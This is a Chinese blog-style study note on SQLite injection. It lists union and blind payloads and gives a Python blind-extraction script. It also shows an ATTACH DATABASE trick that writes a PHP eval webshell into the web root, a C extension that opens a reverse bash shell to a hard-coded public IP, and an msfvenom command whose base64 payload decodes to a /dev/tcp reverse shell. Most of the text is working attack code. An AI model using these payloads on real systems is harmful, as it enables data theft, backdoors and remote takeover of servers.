---
title: sqlite注入总结
date: 2025-11-30 16:16:39
tags:
- sqlite注入
category:
- 学习笔记
---

# sqlite注入总结

SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。它是一个零配置的数据库，这意味着与其他数据库不一样，您不需要在系统中配置。
就像其他数据库，SQLite 引擎不是一个独立的进程，可以按应用程序需求进行静态或动态连接。SQLite 直接访问其存储文件。

---

## 基础语法：

基本和mysql差不多

```
# 数据库基础语法(建库)
sqlite3 sqltest.db           #sqlite的每一个数据库就是一个文件


#执行这个命令成功创建数据库文件之后，将提供一个 sqlite> 提示符。
sqlite> .databases             #判断数据库是否存在
sqlite> .open sqltest.db       #打开数据库
sqlite> .tables                #列出数据库中所有的表
sqlite> .schema test           #得到该表所使用的命令


#创建表，语句和mysql差不多，先进入sqlite>下
sqlite> create table test(
   ...> id INT PRIMARY KEY     NOT NULL,
   ...> name char(50) NOT NULL
   ...> );
   
   
#向表中插入数据
sqlite> insert into test (id,name) values (1,'alice');
sqlite> insert into test (id,name) values (2,'bob');

#查询语句
sqlite> select * from test;

#导入导出
sqlite3 testDB.db .dump > testDB.sql   #导出
sqlite3 testDB.db < testDB.sql         #导入

```

---

## sqlite_master

 sqlite_master表中保存数据库表的关键信息。
 他保存了执行的sql语句，也是之后注入 查询表名列名的关键。

可知，sqlite_master 表中的 sql 字段中记录着你建表留下的完整的记录，也就是说我们在注入的时候可以通过查询  sqlite_master 表来获取数据库中的表名以及表结构，这就像我们在 MySQL 注入中查询 information_schema 一样。

```
#表中包含的字段如下
sqlite> .schema sqlite_master
CREATE TABLE sqlite_master (
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);

#从sqlite_master查表名:
sqlite> select tbl_name from sqlite_master where type='table';
#获取表名和列名
sqlite> select sql from sqlite_master where type='table';  #会打印出创建表时所执行的sql语句

#设置格式化输出，可以更加直观的看到执行结果
sqlite>.header on
sqlite>.mode column
sqlite>.timer on

```

---

## 常规注入手法：

```
#查询字段数
-1' union select 1,2,3;
1' order by 3;
#查版本
0' union select 1,2,sqlite_version();
#查询表名和列名 通过查询 sqlite_master 表来实现：
-1' union select 1,2,(select sql from sqlite_master limit 0,1),4;
#当存在多个表时，我们可以用 limit 关键字逐行读取，也可以使用 group_concat 关键字进行聚合：
-1' union select 1,2,(select group_concat(sql) from sqlite_master),4;
0' union select 1,2,tbl_name FROM sqlite_master  limit 2 offset 1 --
#查询数据
-1' union select 1,2,(select group_concat(username,password) from table_name),4;

布尔盲注
#根据查询正确或错误时的页面回显来判断数据内容： 
-1' or length(sqlite_version())=5/*
-1' or length(sqlite_version())=6/*

-1' or substr((select group_concat(sql) from sqlite_master),1,1)>'a'/*
-1' or substr((select group_concat(sql) from sqlite_master),1,1)<'a'/*
-1' or substr((select group_concat(sql) from sqlite_master),2,1)>'b'/*
-1' or substr((select group_concat(sql) from sqlite_master),2,1)<'b'/*
-1' or substr((select group_concat(sql) from sqlite_master),3,1)>'C'/*
-1' or substr((select group_concat(sql) from sqlite_master),3,1)<'C'/*
......

时间盲注
#QLite 没有 sleep() 函数，但是有个 randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。
并且 SQLite 没有 if，所以我们需要使用 case...when 来构造查询语句：
-1' or (case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end)/*

```

## 布尔盲注

盲注语句：

布尔盲注表名

```
/check.php?name=1'or substr((select group_concat(name) from sqlite_master),1-100,1)='ascii可打印字符'--
```

注建表语句

```
1'or substr((select sql from sqlite_master where name='users'),{{int(0-200)}},1)='ascii可打印字符'--

```

注数据

```
1'or substr((select secret from users),N,1)='X'--
```

盲注脚本

```
import requests
url = 'http://192.168.219.130/index.php'
flag = ''
for i in range(1,500):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       payload = "-1' or substr((select hex(group_concat(sql)) from sqlite_master),{0},1)>'{1}'/*".format(i,chr(mid))
       datas = {
           "id": payload
       }
       res = requests.post(url=url,data=datas)

       if 'Username' in res.text:      # 为真时，即判断正确的时候的条件
           low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):
       break
   flag = flag+chr(mid)
   print(flag)

print('\n'+bytes.fromhex(flag).decode('utf-8'))

```

---

## 时间盲注

SQLite 没有 sleep() 函数，但是有个 randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。

 并且 SQLite 没有 if，所以我们需要使用 case…when 来构造查询语句：

```
-1' or (case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end)/*
```

---

## sqlite写shell

### **SQLite 附加数据库**

假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库。SQLite 的 ATTACH DATABASE 语句的基本语法如下：

```
ATTACH DATABASE file_name AS database_name;
```

打开的数据库和使用 ATTACH 附加进来的数据库的必须位于同一文件夹下。如果数据库尚未被创建，上面的命令将创建一个数据库。

如下，我们想附加一个现有的数据库 testDB.db：

```
sqlite> ATTACH DATABASE 'testDB.db' as 'TEST';
```

如下，执行 .database 命令后，可以看到成功附加了一个 TEST：

```
sqlite> .database
main: /root/DatabaseName.db
TEST: /root/testDB.db
```

### sqlite写shell

**关键点:** 如果数据库文件路径设置在web目录下，就可以实现写shell的功能。
 要实现写shell，需要如下操作：
 通过 attach 在目标目录新建一个数据库文件  =>  在新数据库创建表  =>  在表中插入payload

```
ATTACH DATABASE '/var/www/html/shell.php' AS shell;    # 附加一个名为 shell.php 的数据库
create TABLE shell.exp (webshell text);    # 为 shell 库创建一个表
insert INTO shell.exp (webshell) VALUES ('\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n');    # 插入数据
```

这样再访问shell.php传入参数x就能getshell了

---

## SQLite 加载动态库

为了方便开发者可以很轻便的扩展功能，SQLite 从 3.3.6 版本开始提供了支持扩展的能力，通过sqlite_load_extension API（或者 load_extension 函数 ），开发者可以在不改动 SQLite 源码的情况下，通过动态加载的库（so/dll/dylib）来扩展 SQLite 的能力。与 MySQL 中 UDF 类似，如果我们让 SQLite 加载恶意的动态库，那我们便可以达到执行系统命令的目的。

下面我们尝试通过 load_extension 加载恶意扩展实现反弹 Shell。

首先根据 SQLite 官网的例子，编写一个 so 扩展：

```
/* Add your header comment here */
#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>
SQLITE_EXTENSION_INIT1

/* Insert your extension code here */
int tcp_port = 2333;
char *ip = "47.101.57.72";

#ifdef _WIN32
__declspec(dllexport)
#endif

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);

  int fd;
  if ( fork() <= 0){
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(tcp_port);
    addr.sin_addr.s_addr = inet_addr(ip);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
            exit(0);
    }

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    execve("/bin/bash", 0LL, 0LL);
}

  return rc;
}

```

然后编译：

```
gcc -g -fPIC -shared exp.c -o exp.so
# gcc -g -shared exp.c -o exp.dll
```

然后直接加载

```
select load_extension('/root/exp.so');
```

成功反弹 Shell：

```
-1'||load_extension('./uploads/exp.so');/*
```

借助 SQLite 动态加载的这个特性，我们可以通过文件上传等方式在一个可预测的存储路径中预先放置一个覆盖 SQLite  扩展规范的动态库，然后通过 SQL 注入漏洞调用 load_extension，就可以很轻松的激活这个库中的代码，直接形成了远程代码执行漏洞：

但是默认情况下 load_extension 是被禁用的。

也可以使用msf直接生成.so

```
msfvenom -p linux/x64/exec CMD='echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjEzNi4zMy8xMzM3IDA+JjEi|base64 -d|bash' -f elf-so -o evil.so
```

## 绕过手法

### 空格过滤绕过

使用`/**/`代替空格

```
/check.php?name=1'or/**/substr((select/**/group_concat(name)/**/from/**/sqlite_master),1-100,1)='ascii可打印字符'--
```













